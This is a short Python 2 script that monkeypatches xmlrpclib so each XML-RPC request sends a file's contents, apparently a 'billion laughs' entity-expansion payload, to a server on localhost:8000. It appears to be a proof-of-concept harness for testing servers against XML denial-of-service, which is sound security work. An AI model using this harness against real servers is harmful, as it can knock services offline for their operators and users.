import sys
import xmlrpclib
from xmlrpclib import ServerProxy

 
BILLION_LAUGHS = open(sys.argv[1]).read()
 
def billion_laughs_dumps(*args, **kwargs):
    return BILLION_LAUGHS

xmlrpclib.dumps = billion_laughs_dumps

sp = ServerProxy("http://localhost:8000")
print(sp.system.listMethods())
